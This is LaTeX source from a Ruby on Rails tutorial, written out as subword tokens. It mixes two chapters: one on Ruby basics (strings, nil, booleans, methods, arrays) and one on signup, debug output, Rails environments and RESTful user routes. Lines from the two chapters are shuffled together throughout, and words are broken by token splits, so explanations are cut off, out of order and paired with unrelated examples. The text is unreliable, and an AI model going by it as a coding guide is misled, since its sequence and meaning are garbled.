▁The ▁\ k ode { put s } ▁method ▁operat es ▁as ▁a ▁\ emph { side - e ffect } : ▁the ▁expression ▁\ k ode { put s ▁" foo "} ▁ print s ▁the ▁string ▁to ▁the ▁screen ▁and ▁the n ▁returns ▁\ href { http :// www . an s w ers . com / nil }{ li ter ally ▁nothing } : ▁\ k ode { nil } ▁is ▁a ▁special ▁Ruby ▁value ▁for ▁`` not h ing ▁at ▁all ''.
▁( In ▁what ▁follows , ▁I ' ll ▁some times ▁suppress ▁the ▁\ k ode { => ▁nil } ▁part ▁for ▁simplicity .)
▁The ▁related ▁\ k ode { print } ▁method ▁does ▁not :
▁ foo => ▁nil
▁S ing le - quot ed ▁strings
▁All ▁the ▁examples ▁so ▁far ▁have ▁used ▁\ emph { do u b le - quot ed ▁strings }, ▁but ▁Ruby ▁also ▁supports ▁\ emph { s ing le - quot ed } ▁strings .
▁For ▁many ▁uses , ▁the ▁two ▁types ▁of ▁strings ▁are ▁effective ly ▁identical :
▁There ' s ▁an ▁important ▁difference , ▁though ; ▁Ruby ▁won ' t ▁interpolate ▁into ▁\ line break ▁single - quot ed ▁strings :
▁=> ▁" \ # { foo } ▁bar "
▁If ▁double - quot ed ▁strings ▁can ▁do ▁everything ▁that ▁single - quot ed ▁strings ▁can ▁do , ▁and ▁interpolate ▁to ▁b oo t , ▁what ' s ▁the ▁point ▁of ▁single - quot ed ▁strings ?
▁They ▁are ▁often ▁useful ▁because ▁they ▁are ▁tr u ly ▁literal , ▁and ▁contain ▁exactly ▁the ▁characters ▁you ▁type .
▁If ▁you ▁want ▁a ▁variable ▁to ▁contain ▁a ▁literal ▁back slash , ▁single ▁ quot es ▁make ▁it ▁easier :
▁For ▁a ▁small ▁example ▁like ▁this , ▁there ' s ▁not ▁much ▁saving s , ▁but ▁if ▁there ▁are ▁lot s ▁of ▁things ▁to ▁escape ▁it ▁can ▁be ▁a ▁real ▁help :
▁=> ▁" New line s ▁(\ \ n ) ▁and ▁tab s ▁(\ \ t ) ▁both ▁use ▁the ▁back slash ▁character ▁\ \ . "
▁F inally , ▁it ' s ▁worth ▁noting ▁that , ▁in ▁the ▁common ▁case ▁that ▁single ▁and ▁double ▁ quot es ▁are ▁essential ly ▁in ter change able , ▁you ' ll ▁often ▁find ▁that ▁the ▁source ▁code ▁switch es ▁between ▁the ▁two ▁without ▁any ▁apparent ▁pattern .
▁There ' s ▁really ▁nothing ▁to ▁be ▁done ▁about ▁this , ▁except ▁to ▁say , ▁`` Welcome ▁to ▁Ruby ! ''
▁E verything ▁in ▁Ruby , ▁including ▁strings ▁and ▁even ▁\ k ode { nil }, ▁is ▁an ▁\ emph { object }.
▁We ' ll ▁see ▁the ▁technical ▁meaning ▁of ▁this ▁in ▁Section ~\ ref { sec : a _ class _ of _ our _ own }, ▁but ▁I ▁don ' t ▁think ▁any one ▁ever ▁under st ood ▁objects ▁by ▁reading ▁the ▁definition ▁in ▁a ▁book ; ▁you ▁have ▁to ▁build ▁up ▁your ▁in t u it ion ▁for ▁objects ▁by ▁see ing ▁lot s ▁of ▁examples .
▁It ' s ▁easier ▁to ▁describe ▁what ▁objects ▁\ emph { do }, ▁which ▁is ▁respond ▁to ▁messages .
▁An ▁object ▁like ▁a ▁string , ▁for ▁example , ▁can ▁respond ▁to ▁the ▁message ▁\ k ode { length }, ▁which ▁returns ▁the ▁number ▁of ▁characters ▁in ▁the ▁string :
▁T ypically , ▁the ▁messages ▁that ▁get ▁passed ▁to ▁objects ▁are ▁\ emph { methods }, ▁which ▁are ▁functions ▁defined ▁on ▁those ▁objects
▁A p o log ies ▁in ▁ advance ▁for ▁switch ing ▁ha ph a z ar d ly ▁between ▁\ emph { function } ▁and ▁\ emph { method } ▁throughout ▁this ▁chapter ; ▁in ▁Ruby , ▁they ' re ▁the ▁same ▁thing : ▁all ▁methods ▁are ▁functions , ▁and ▁all ▁functions ▁are ▁methods , ▁because ▁everything ▁is ▁an ▁object .
▁ String s ▁also ▁respond ▁to ▁the ▁\ k ode { empty ?}\ ▁method :
▁Note ▁the ▁question ▁mark ▁at ▁the ▁end ▁of ▁the ▁\ k ode { empty ?}\ ▁method .
▁This ▁is ▁a ▁Ruby ▁convention ▁indicat ing ▁that ▁the ▁return ▁value ▁is ▁\ emph { boolean } : ▁\ k ode { true } ▁or ▁\ k ode { false }.
▁Bo o le an s ▁are ▁es pecially ▁useful ▁for ▁\ emph { control ▁ flow } :
▁=> ▁" The ▁string ▁is ▁non empty "
▁To ▁include ▁more ▁than ▁one ▁clause , ▁we ▁can ▁use ▁\ k ode { el s if } ▁(\ k ode { else } ▁ + ▁\ k ode { if }) :
▁Now ▁that ▁we ▁have ▁a ▁working ▁User ▁model , ▁it ' s ▁time ▁to ▁add ▁an ▁ability ▁few ▁website s ▁can ▁live ▁without : ▁let ting ▁users ▁sign ▁up .
▁We ' ll ▁use ▁an ▁HTML ▁\ emph { form } ▁to ▁submit ▁user ▁signup ▁information ▁to ▁our ▁application ▁( Section ~\ ref { sec : signup _ form }), ▁which ▁will ▁the n ▁be ▁used ▁to ▁create ▁a ▁new ▁user ▁and ▁save ▁its ▁attributes ▁to ▁the ▁database ▁( Section ~\ ref { sec : successful _ signup s }).
▁At ▁the ▁end ▁of ▁the ▁signup ▁process , ▁it ' s ▁important ▁to ▁render ▁a ▁profile ▁page ▁with ▁the ▁new ly ▁created ▁user ' s ▁information , ▁so ▁we ' ll ▁begin ▁by ▁making ▁a ▁page ▁for ▁\ emph { showing } ▁users , ▁which ▁will ▁serve ▁as ▁the ▁first ▁step ▁toward ▁implement ing ▁the ▁REST ▁architecture ▁for ▁users ▁( Section ~\ ref { sec : mvc _ in _ action }).
▁A long ▁the ▁way , ▁we ' ll ▁build ▁on ▁our ▁work ▁in ▁Section ~\ ref { sec : layout _ link _ tests } ▁to ▁write ▁succinct ▁and ▁express ive ▁integration ▁tests .
▁In ▁this ▁chapter , ▁we ' ll ▁rely ▁on ▁the ▁User ▁model ▁validations ▁from ▁Chapter ~\ ref { cha : modeling _ users } ▁to ▁increase ▁the ▁odd s ▁of ▁new ▁users ▁ having ▁valid ▁email ▁addresses .
▁In ▁Chapter ~\ ref { cha : account _ activation _ and _ password _ reset }, ▁we ' ll ▁make ▁\ emph { s ure } ▁of ▁email ▁validity ▁by ▁adding ▁a ▁separate ▁\ emph { account ▁activation } ▁step ▁to ▁user ▁signup .
▁" O n e ▁of ▁the ▁strings ▁is ▁empty "
▁" x ▁is ▁not ▁empty "
▁S ince ▁everything ▁in ▁Ruby ▁is ▁an ▁object , ▁it ▁follows ▁that ▁\ k ode { nil } ▁is ▁an ▁object , ▁so ▁it ▁too ▁can ▁respond ▁to ▁methods .
▁One ▁example ▁is ▁the ▁\ k ode { to \_ s } ▁method ▁that ▁can ▁convert ▁virtual ly ▁any ▁object ▁to ▁a ▁string :
▁In ▁this ▁section , ▁we ' ll ▁take ▁the ▁first ▁steps ▁toward ▁the ▁final ▁profile ▁by ▁making ▁a ▁page ▁to ▁display ▁a ▁user ' s ▁name ▁and ▁profile ▁ photo , ▁as ▁indicate d ▁by ▁the ▁mockup ▁in ▁F igure ~\ ref { fig : profile _ mockup _ profile _ name }
▁This ▁certain ly ▁appears ▁to ▁be ▁an ▁empty ▁string , ▁as ▁we ▁can ▁verify ▁by ▁\ emph { cha in ing } ▁the ▁messages ▁we ▁pass ▁to ▁\ k ode { nil } :
▁Ou r ▁eventual ▁goal ▁for ▁the ▁user ▁profile ▁pages ▁is ▁to ▁show ▁the ▁user ' s ▁profile ▁image , ▁basic ▁user ▁data , ▁and ▁a ▁list ▁of ▁microposts , ▁as ▁mock ed ▁up ▁in ▁F igure ~\ ref { fig : profile _ mockup }
▁ NoMethodError : ▁undefined ▁method ▁` empty ? '
▁( F igure ~\ ref { fig : profile _ mockup } ▁has ▁our ▁first ▁example ▁of ▁\ emph { lo re m ▁ ip sum } ▁text , ▁which ▁has ▁a ▁\ href { http :// www . str a ight do p e . com / columns / read / 22 9 0 / what - do es - the - fi ll er - text - lo re m - ip sum - me an }{ fa sc in at ing ▁ s tory } ▁that ▁you ▁should ▁defin ite ly ▁read ▁about ▁some ▁time .)
▁# ▁ Message ▁chain ing
▁We ' ll ▁complete ▁this ▁task , ▁and ▁with ▁it ▁the ▁sample ▁application , ▁in ▁Chapter ~\ ref { cha : following _ users }.
▁If ▁you ' re ▁following ▁along ▁with ▁version ▁control , ▁make ▁a ▁topic ▁branch ▁as ▁usual :
▁We ▁see ▁here ▁that ▁the ▁\ k ode { nil } ▁object ▁does n ' t ▁itself ▁respond ▁to ▁the ▁\ k ode { empty ?}\ ▁method , ▁but ▁\ k ode { nil . to \_ s } ▁does .
▁There ' s ▁a ▁special ▁method ▁for ▁testing ▁for ▁\ k ode { nil } - n es s , ▁which ▁you ▁m ight ▁be ▁able ▁to ▁guess :
▁sign - up
▁A ▁mockup ▁of ▁the ▁user ▁profile ▁made ▁in ▁this ▁section .
▁A ▁mockup ▁of ▁our ▁best ▁guess ▁at ▁the ▁final ▁profile ▁page .
▁Rails ▁environments
▁The ▁profile s ▁in ▁this ▁section ▁will ▁be ▁the ▁first ▁tr u ly ▁dynamic ▁pages ▁in ▁our ▁application .
▁also ▁shows ▁an ▁alternate ▁use ▁of ▁the ▁\ k ode { if } ▁keyword : ▁Ruby ▁allows ▁you ▁to ▁write ▁a ▁statement ▁that ▁is ▁evaluated ▁only ▁if ▁the ▁statement ▁following ▁\ k ode { if } ▁is ▁true .
▁A lthough ▁the ▁view ▁will ▁exist ▁as ▁a ▁single ▁page ▁of ▁code , ▁each ▁profile ▁will ▁be ▁customize d ▁using ▁information ▁retrieved ▁from ▁the ▁application ' s ▁database .
▁There ' s ▁a ▁complement ary ▁\ k ode { unless } ▁keyword ▁that ▁works ▁the ▁same ▁way :
▁As ▁prepar ation ▁for ▁adding ▁dynamic ▁pages ▁to ▁our ▁sample ▁application , ▁now ▁is ▁a ▁good ▁time ▁to ▁add ▁some ▁debug ▁information ▁to ▁our ▁site ▁layout ▁( Listing ~\ ref { code : rails _ debug }).
▁This ▁display s ▁some ▁useful ▁information ▁about ▁each ▁page ▁using ▁the ▁built - in ▁\ k ode { debug } ▁method ▁and ▁\ k ode { params } ▁variable ▁( which ▁we ' ll ▁learn ▁more ▁about ▁in ▁Section ~\ ref { sec : a _ users _ resource }).
▁ Adding ▁some ▁debug ▁information ▁to ▁the ▁site ▁layout .
▁The ▁string ▁' foobar ' ▁is ▁non empty .
▁It ' s ▁worth ▁noting ▁that ▁the ▁\ k ode { nil } ▁object ▁is ▁special , ▁in ▁that ▁it ▁is ▁the ▁\ emph { only } ▁Ruby ▁object ▁that ▁is ▁false ▁in ▁a ▁boolean ▁context , ▁a part ▁from ▁\ k ode { false } ▁itself .
▁We ▁can ▁see ▁this ▁using ▁\ k ode { ! ! } \ ▁( read ▁`` bang ▁ bang '') , ▁which ▁ n eg ate s ▁an ▁object ▁t w ic e , ▁there by ▁co er c ing ▁it ▁to ▁its ▁boolean ▁value :
▁In ▁particular , ▁all ▁other ▁Ruby ▁objects ▁are ▁\ emph { true }, ▁even ▁0 :
▁S ince ▁we ▁don ' t ▁want ▁to ▁display ▁debug ▁information ▁to ▁users ▁of ▁a ▁deploy ed ▁application , ▁Listing ~\ ref { code : rails _ debug } ▁uses
▁The ▁console ▁allows ▁us ▁to ▁define ▁methods ▁the ▁same ▁way ▁we ▁did ▁with ▁the ▁\ k ode { home } ▁action ▁from ▁Listing ~\ ref { code : static _ pages _ controller } ▁or ▁the ▁\ k ode { full \_ title } ▁helper ▁from ▁Listing ~\ ref { code : title _ helper }.
▁You ▁can ▁define ▁your ▁own ▁custom ▁environments ▁as ▁well ; ▁see ▁the ▁\ href { http :// r ailscasts . com / episodes / 7 2 - adding - an - environment }{ RailsCast ▁on ▁adding ▁an ▁environment } ▁for ▁details .
▁( D e f in ing ▁methods ▁in ▁the ▁console ▁is ▁a ▁bit ▁cumbersome , ▁and ▁or dinarily ▁you ▁would ▁use ▁a ▁file , ▁but ▁it ' s ▁convenient ▁for ▁ demo n str ation ▁purposes .)
▁In ▁particular , ▁\ k ode { Rails . env . development ?}\ ▁is ▁\ k ode { true } ▁only ▁in ▁a ▁development ▁environment , ▁so ▁the ▁ embedded ▁Ruby
▁For ▁example , ▁let ' s ▁define ▁a ▁function ▁\ k ode { string \_ message } ▁that ▁take s ▁a ▁single ▁\ emph { argument } ▁and ▁returns ▁a ▁message ▁base d ▁on ▁whether ▁the ▁argument ▁is ▁empty ▁or ▁not :
▁won ' t ▁be ▁inserted ▁into ▁production ▁applications ▁or ▁tests .
▁It ' s ▁an ▁empty ▁string !
▁( In s er ting ▁the ▁debug ▁information ▁into ▁tests ▁ probably ▁would n ' t ▁do ▁any ▁harm , ▁but ▁it ▁ probably ▁would n ' t ▁do ▁any ▁good , ▁either , ▁so ▁it ' s ▁best ▁to ▁restrict ▁the ▁debug ▁display ▁to ▁development ▁only .)
▁else
▁The ▁string ▁is ▁non empty .
▁Rails ▁comes ▁equip ped ▁with ▁three ▁environments : ▁\ text tt { test }, ▁\ text tt { development }, ▁and ▁\ text tt { production }.
▁end
▁The ▁default ▁environment ▁for ▁the ▁Rails ▁console ▁is ▁\ text tt { development } :
▁< n > ▁ $ ▁rails ▁console
▁< n > ▁Load ing ▁development ▁environment
▁< n > ▁ >> ▁Rails . env
▁< n > ▁=> ▁" development "
▁< n > ▁ >> ▁Rails . env . development ?
▁As ▁seen ▁in ▁the ▁final ▁example , ▁it ' s ▁possible ▁to ▁leave ▁out ▁the ▁argument ▁entire ly ▁( in ▁which ▁case ▁we ▁can ▁also ▁omit ▁the ▁parentheses ).
▁< n > ▁=> ▁true
▁This ▁is ▁because ▁the ▁code
▁< n > ▁ >> ▁Rails . env . test ?
▁< n > ▁=> ▁false
▁contains ▁a ▁\ emph { default } ▁argument , ▁which ▁in ▁this ▁case ▁is ▁the ▁empty ▁string .
▁This ▁make s ▁the ▁\ k ode { str } ▁argument ▁optional , ▁and ▁if ▁we ▁leave ▁it ▁off ▁it ▁automatically ▁take s ▁the ▁given ▁default ▁value .
▁As ▁you ▁can ▁see , ▁Rails ▁provides ▁a ▁\ text tt { Rails } ▁object ▁with ▁an ▁\ text tt { env } ▁attribute ▁and ▁ associated ▁environment ▁boolean ▁methods , ▁so ▁that , ▁for ▁example , ▁\ text tt { Rails . env . test ? } ▁returns ▁\ text tt { true } ▁in ▁a ▁test ▁environment ▁and ▁\ text tt { false } ▁otherwise .
▁Note ▁that ▁Ruby ▁functions ▁have ▁an ▁\ emph { implicit ▁return }, ▁meaning ▁they ▁return ▁the ▁last ▁statement ▁evaluated --- in ▁this ▁case , ▁one ▁of ▁the ▁two ▁message ▁strings , ▁depending ▁on ▁whether ▁the ▁method ' s ▁argument ▁\ k ode { str } ▁is ▁empty ▁or ▁not .
▁If ▁you ▁ever ▁need ▁to ▁run ▁a ▁console ▁in ▁a ▁different ▁environment ▁( to ▁debug ▁a ▁test , ▁for ▁example ), ▁you ▁can ▁pass ▁the ▁environment ▁as ▁a ▁parameter ▁to ▁the ▁\ text tt { console } ▁ script :
▁Ruby ▁also ▁has ▁an ▁explicit ▁return ▁option ; ▁the ▁following ▁function ▁is ▁equivalent ▁to ▁the ▁one ▁above :
▁< n > ▁ $ ▁rails ▁console ▁test
▁< n > ▁Load ing ▁test ▁environment
▁< n > ▁=> ▁" test "
▁( The ▁ alert ▁reader ▁m ight ▁notice ▁at ▁this ▁point ▁that ▁the ▁second ▁\ k ode { return } ▁here ▁is ▁actually ▁unnecessary --- be ing ▁the ▁last ▁expression ▁in ▁the ▁function , ▁the ▁string ▁\ k ode {" The ▁string ▁is ▁non empty . "} ▁will ▁be ▁returned ▁regardless ▁of ▁the ▁\ k ode { return } ▁keyword , ▁but ▁using ▁\ k ode { return } ▁in ▁both ▁place s ▁has ▁a ▁p le as ing ▁ s y m me try ▁to ▁it .)
▁As ▁with ▁the ▁console , ▁\ text tt { development } ▁is ▁the ▁default ▁environment ▁for ▁the ▁Rails ▁server , ▁but ▁you ▁can ▁also ▁run ▁it ▁in ▁a ▁different ▁environment :
▁It ' s ▁also ▁important ▁to ▁understand ▁that ▁the ▁name ▁of ▁the ▁function ▁argument ▁is ▁irrelevant ▁as ▁far ▁as ▁the ▁call er ▁is ▁concern ed .
▁< n > ▁ $ ▁rails ▁server ▁-- environment ▁production
▁In ▁other ▁words , ▁the ▁first ▁example ▁above ▁could ▁replace ▁\ k ode { str } ▁with ▁any ▁other ▁valid ▁variable ▁name , ▁such ▁as ▁\ k ode { the \_ function \_ argument }, ▁and ▁it ▁would ▁work ▁just ▁the ▁same :
▁If ▁you ▁view ▁your ▁app ▁running ▁in ▁production , ▁it ▁won ' t ▁work ▁without ▁a ▁production ▁database , ▁which ▁we ▁can ▁create ▁by ▁running ▁\ text tt { rake ▁db : migrate } ▁in ▁production :
▁< n > ▁ $ ▁bundle ▁exec ▁rake ▁db : migrate ▁R AIL S _ ENV = production
▁( I ▁find ▁it ▁confusing ▁that ▁the ▁console , ▁server , ▁and ▁ migrate ▁commands ▁specify ▁non - default ▁environments ▁in ▁three ▁m u t u ally ▁in com p at i b le ▁ways , ▁which ▁is ▁why ▁I ▁both er ed ▁show ing ▁all ▁three .)
▁By ▁the ▁way , ▁if ▁you ▁have ▁deploy ed ▁your ▁sample ▁app ▁to ▁Heroku , ▁you ▁can ▁see ▁its ▁environment ▁using ▁\ text tt { heroku ▁run ▁console } :
▁< n > ▁ $ ▁ heroku ▁run ▁console
▁< n > ▁=> ▁" production "
▁< n > ▁ >> ▁Rails . env . production ?
▁We ll , ▁there ▁will ▁ still ▁be ▁\ emph { one } ▁thing ▁left ▁that ▁we ▁don ' t ▁understand , ▁which ▁is ▁how ▁Rails ▁t ies ▁this ▁all ▁together : ▁mapping ▁URLs ▁to ▁actions , ▁making ▁the ▁\ k ode { full \_ title } ▁helper ▁available ▁in ▁views , ▁etc . ▁This ▁is ▁an ▁interest ing ▁subject , ▁and ▁I ▁encourag e ▁you ▁to ▁in ve st ig ate ▁it ▁further , ▁but ▁know ing ▁exactly ▁\ emph { how } ▁Rails ▁works ▁is ▁not ▁necessary ▁when ▁\ emph { using } ▁Rails .
▁N at ur ally , ▁since ▁Heroku ▁is ▁a ▁platform ▁for ▁production ▁site s , ▁it ▁run s ▁each ▁application ▁in ▁a ▁production ▁environment .
▁( For ▁a ▁ deep er ▁understanding , ▁I ▁recommend ▁\ emph { The ▁Rails ~ 4 ▁Way } ▁by ▁O b i e ▁F er n and e z .)
▁To ▁make ▁the ▁debug ▁output ▁look ▁nice , ▁we ' ll ▁add ▁some ▁rules ▁to ▁the ▁custom ▁stylesheet ▁created ▁in ▁Chapter ~\ ref { cha : filling _ in _ the _ layout }, ▁as ▁show n ▁in ▁Listing ~\ ref { code : mixin _ and _ debug }.
▁in ▁Listing ~\ ref { code : annotate d _ title _ helper }.
▁ Adding ▁code ▁for ▁a ▁ pretty ▁debug ▁box , ▁including ▁a ▁Sass ▁ mixin .
▁An ▁ annotate d ▁\ k ode { title \_ helper }.
▁This ▁introduce s ▁the ▁Sass ▁\ emph { mixin } ▁facilit y , ▁in ▁this ▁case ▁called ▁\ k ode { box \_ s i z ing }.
▁# ▁Documentation ▁comment
▁A ▁ mixin ▁allows ▁a ▁group ▁of ▁CSS ▁rules ▁to ▁be ▁package d ▁up ▁and ▁used ▁for ▁multiple ▁elements , ▁convert ing
▁ Method
▁We ' ll ▁put ▁this ▁ mixin ▁to ▁use ▁again ▁in ▁Section ~\ ref { sec : using _ form _ for }.
▁The ▁result ▁in ▁the ▁case ▁of ▁the ▁debug ▁box ▁is ▁show n ▁in ▁F igure ~\ ref { fig : home _ page _ with _ debug }.
▁# ▁Bo o le an ▁test
▁The ▁sample ▁application ▁Home ▁page ▁with ▁debug ▁information .
▁The ▁debug ▁output ▁in ▁F igure ~\ ref { fig : home _ page _ with _ debug } ▁gives ▁ potentially ▁useful ▁information ▁about ▁the ▁page ▁being ▁rendered :
▁The ▁Rails ▁\ k ode { debug } ▁information ▁is ▁show n ▁as ▁\ href { http :// www . y am l . org /}{ YAML } ▁( a ▁\ href { http :// cat b . org / j argon / html / R / recursive - acronym . html }{ recursive ▁ acronym } ▁stand ing ▁for ▁`` YAML ▁A in ' t ▁M ar k up ▁L an g u age '') , ▁which ▁is ▁a ▁ friendly ▁data ▁format ▁design ed ▁to ▁be ▁both ▁machine - ▁\ emph { and } ▁human - read able .
▁We ' ll ▁see ▁another ▁example ▁in ▁Section ~\ ref { sec : a _ users _ resource }.
▁In ▁order ▁to ▁make ▁a ▁user ▁profile ▁page , ▁we ▁need ▁to ▁have ▁a ▁user ▁in ▁the ▁database , ▁which ▁introduce s ▁a ▁ ch ic k en - and - eg g ▁problem : ▁how ▁can ▁the ▁site ▁have ▁a ▁user ▁before ▁there ▁is ▁a ▁working ▁signup ▁page ?
▁H appily , ▁this ▁problem ▁has ▁already ▁been ▁solve d : ▁in ▁Section ~\ ref { sec : creating _ and _ authenticating _ a _ user }, ▁we ▁created ▁a ▁User ▁record ▁by ▁hand ▁using ▁the ▁Rails ▁console , ▁so ▁there ▁should ▁be ▁one ▁user ▁in ▁the ▁database :
▁( T hanks ▁to ▁reader ▁ J er e my ▁F le is ch ma n ▁for ▁point ing ▁out ▁this ▁subtle ▁issue .)
▁( If ▁you ▁don ' t ▁current ly ▁have ▁a ▁user ▁in ▁your ▁database , ▁you ▁should ▁visit ▁Section ~\ ref { sec : creating _ and _ authenticating _ a _ user } ▁now ▁and ▁complete ▁it ▁before ▁proceeding .)
▁The ▁final ▁element ▁is ▁\ k ode { module ▁Application Helper } : ▁module s ▁give ▁us ▁a ▁way ▁to ▁package ▁together ▁related ▁methods , ▁which ▁can ▁the n ▁be ▁\ emph { m i x ed ▁in } ▁to ▁Ruby ▁classes ▁using ▁\ k ode { include }.
▁We ▁see ▁from ▁the ▁console ▁output ▁above ▁that ▁the ▁user ▁has ▁id ~\ k ode {1} , ▁and ▁our ▁goal ▁now ▁is ▁to ▁make ▁a ▁page ▁to ▁display ▁this ▁user ' s ▁information .
▁When ▁writing ▁ordinar y ▁Ruby , ▁you ▁often ▁write ▁module s ▁and ▁include ▁them ▁explicitly ▁yourself , ▁but ▁in ▁the ▁case ▁of ▁a ▁helper ▁module ▁Rails ▁handle s ▁the ▁inclusion ▁for ▁us .
▁The ▁result ▁is ▁that ▁the ▁\ k ode { full \_ title } ▁method ▁is ▁\ href { http :// cat b . org / j argon / html / A / automagically . html }{ automagically } ▁available ▁in ▁all ▁our ▁views .
▁When ▁following ▁REST ▁principle s , ▁resources ▁are ▁typical ly ▁referenced ▁using ▁the ▁resource ▁name ▁and ▁a ▁unique ▁identifier .
▁< n >< n > ▁% ▁subsection ▁back _ to _ the _ title _ helper ▁( end )< n >< n > ▁\ section { O the r ▁data ▁structure s } ▁% ▁( fold )< n > ▁\ label { sec : other _ data _ structure s }< n >< n >
▁What ▁this ▁means ▁in ▁the ▁context ▁of ▁users --- which ▁we ' re ▁now ▁think ing ▁of ▁as ▁a ▁Users ▁\ emph { resource }--- is ▁that ▁we ▁should ▁view ▁the ▁user ▁with ▁id ~\ k ode {1} ▁by ▁is s u ing ▁a ▁\ text tt { GET } ▁request ▁to ▁the ▁URL ▁/ users /1 .
▁A lthough ▁web ▁app s ▁are ▁ ultimate ly ▁about ▁strings , ▁actually ▁\ emph { ma k ing } ▁those ▁strings ▁requires ▁using ▁other ▁data ▁structure s ▁as ▁well .
▁Here ▁the ▁\ k ode { show } ▁action ▁is ▁\ emph { implicit } ▁in ▁the ▁type ▁of ▁request --- when ▁Rails ' ▁REST ▁features ▁are ▁ activated , ▁\ text tt { GET } ▁requests ▁are ▁automatically ▁handle d ▁by ▁the ▁\ k ode { show } ▁action .
▁In ▁this ▁section , ▁we ' ll ▁learn ▁about ▁some ▁Ruby ▁data ▁structure s ▁important ▁for ▁writing ▁Rails ▁applications .
▁We ▁saw ▁in ▁Section ~\ ref { sec : a _ user _ to ur } ▁that ▁the ▁page ▁for ▁a ▁user ▁with ▁id ~\ k ode {1} ▁has ▁URL ▁/ users /1 .
▁< n >< n > ▁\ subsection { Array s ▁and ▁range s } ▁% ▁( fold )< n > ▁\ label { sec : array s _ and _ range s }< n >< n >
▁An ▁array ▁is ▁just ▁a ▁list ▁of ▁elements ▁in ▁a ▁particular ▁order .
▁U nfortunately , ▁visit ing ▁that ▁URL ▁right ▁now ▁just ▁gives ▁an ▁error , ▁as ▁seen ▁in ▁the ▁server ▁log ▁( F igure ~\ ref { fig : profile _ routing _ error }).
▁We ▁have n ' t ▁discuss ed ▁arrays ▁yet ▁in ▁the ▁\ emph { Rails ▁Tutorial }, ▁but ▁understanding ▁them ▁gives ▁a ▁good ▁foundation ▁for ▁understanding ▁hashes ▁( Section ~\ ref { sec : hashes _ and _ symbol s }) ▁and ▁for ▁aspect s ▁of ▁Rails ▁data ▁model ing ▁( such ▁as ▁the ▁\ k ode { has \_ many } ▁association ▁seen ▁in ▁Section ~\ ref { sec : demo _ user _ has _ many _ microposts } ▁and ▁covered ▁more ▁in ▁Section ~\ ref { sec : user _ micropost _ associations }).
▁The ▁server ▁log ▁error ▁for ▁/ users /1 .
▁So ▁far ▁we ' ve ▁sp ent ▁a ▁lot ▁of ▁time ▁understanding ▁strings , ▁and ▁there ' s ▁a ▁natural ▁way ▁to ▁get ▁from ▁strings ▁to ▁arrays ▁using ▁the ▁\ k ode { split } ▁method :
▁We ▁can ▁get ▁the ▁routing ▁for ▁/ users /1 ▁to ▁work ▁by ▁adding ▁a ▁single ▁line ▁to ▁our ▁routes ▁file ▁(\ k ode { config / routes . rb }) :
▁The ▁result ▁appears ▁in ▁Listing ~\ ref { code : users _ resource }
▁The ▁result ▁of ▁this ▁operation ▁is ▁an ▁array ▁of ▁three ▁strings .
▁ Adding ▁a ▁Users ▁resource ▁to ▁the ▁routes ▁file .
▁By ▁default , ▁\ k ode { split } ▁ div id es ▁a ▁string ▁into ▁an ▁array ▁by ▁ split ting ▁on ▁whitespace , ▁but ▁you ▁can ▁ split ▁on ▁ nearly ▁anything ▁else ▁as ▁well :
▁page ▁to ▁show ▁user
▁/ users /1
▁As ▁is ▁conventional ▁in ▁most ▁computer ▁languages , ▁Ruby ▁arrays ▁are ▁\ emph { zero - offset }, ▁which ▁means ▁that ▁the ▁first ▁element ▁in ▁the ▁array ▁has ▁index ~ 0, ▁the ▁second ▁has ▁index ~ 1, ▁and ▁so ▁on :
▁This ▁means ▁that ▁the ▁\ emph { routing } ▁works , ▁but ▁the ▁corresponding ▁pages ▁don ' t ▁necessar ily ▁work ▁at ▁this ▁point .
▁=> ▁[ 4 2 , ▁ 8 , ▁ 17 ]
▁For ▁example , ▁/ users /1/ edit ▁get s ▁route d ▁properly ▁to ▁the ▁\ k ode { edit } ▁action ▁of ▁the ▁Users ▁controller , ▁but ▁since ▁the ▁\ k ode { edit } ▁action ▁does n ' t ▁exist ▁yet ▁actually ▁hit ting ▁that ▁URL ▁will ▁return ▁an ▁error .
▁=> ▁42
▁The ▁result ing ▁correspond ence ▁of ▁URLs , ▁actions , ▁and ▁named ▁routes ▁is ▁show n ▁in ▁Table ~\ ref { table : RESTful _ users }.
▁=> ▁ 17
▁( Compar e ▁to ▁Table ~\ ref { table : demo _ RESTful _ users }. )
▁Over ▁the ▁course ▁of ▁the ▁next ▁three ▁chapter s , ▁we ' ll ▁cover ▁all ▁of ▁the ▁other ▁ en tries ▁in ▁Table ~\ ref { table : RESTful _ users } ▁as ▁we ▁fill ▁in ▁all ▁the ▁actions ▁necessary ▁to ▁make ▁Users ▁a ▁fully ▁RESTful ▁resource .
▁We ▁see ▁here ▁that ▁Ruby ▁uses ▁ s q u a re ▁bracket s ▁to ▁access ▁array ▁elements .
▁In ▁addition ▁to ▁this ▁bracket ▁notation , ▁Ruby ▁offer s ▁ s y n on y m s ▁for ▁some ▁commonly ▁access ed ▁elements
▁The ▁\ k ode { second } ▁method ▁used ▁here ▁is n ' t ▁current ly ▁part ▁of ▁Ruby ▁itself , ▁but ▁rather ▁is ▁added ▁by ▁Rails .
▁/ users
▁It ▁works ▁in ▁this ▁case ▁because ▁the ▁Rails ▁console ▁automatically ▁includes ▁the ▁Rails ▁extensions ▁to ▁Ruby .
▁page ▁to ▁list ▁all ▁users
▁/ users / new
▁This ▁last ▁line ▁introduce s ▁the ▁equal ity ▁comparison ▁operator ▁\ k ode {==} , ▁which ▁Ruby ▁share s ▁with ▁many ▁other ▁languages , ▁along ▁with ▁the ▁ associated ▁\ k ode { ! = } ▁( ` ` not ▁equal '') , ▁etc . :
▁page ▁to ▁make ▁a ▁new ▁user ▁( signup )
▁create ▁a ▁new ▁user
▁/ users /1/ edit
▁page ▁to ▁edit ▁user ▁with ▁id ▁\ k ode {1}
▁update ▁user
▁In ▁addition ▁to ▁\ k ode { length } ▁( see n ▁in ▁the ▁first ▁line ▁above ), ▁arrays ▁respond ▁to ▁a ▁we al th ▁of ▁other ▁methods :
▁delete ▁user
▁RESTful ▁routes ▁provided ▁by ▁the ▁Users ▁resource ▁in ▁Listing ~\ ref { code : users _ resource }.
▁With ▁the ▁code ▁in ▁Listing ~\ ref { code : users _ resource }, ▁the ▁routing ▁works , ▁but ▁there ' s ▁ still ▁no ▁page ▁there ▁( F igure ~\ ref { fig : user _ show _ unknown _ action }).
▁=> ▁[ 8 , ▁ 17 , ▁42 ]
▁To ▁fix ▁this , ▁we ' ll ▁begin ▁with ▁a ▁minimal ist ▁version ▁of ▁the ▁profile ▁page , ▁which ▁we ' ll ▁f le s h ▁out ▁in ▁Section ~\ ref { sec : a _ gravatar _ image }.
▁=> ▁[ 17 , ▁ 8 , ▁42 ]
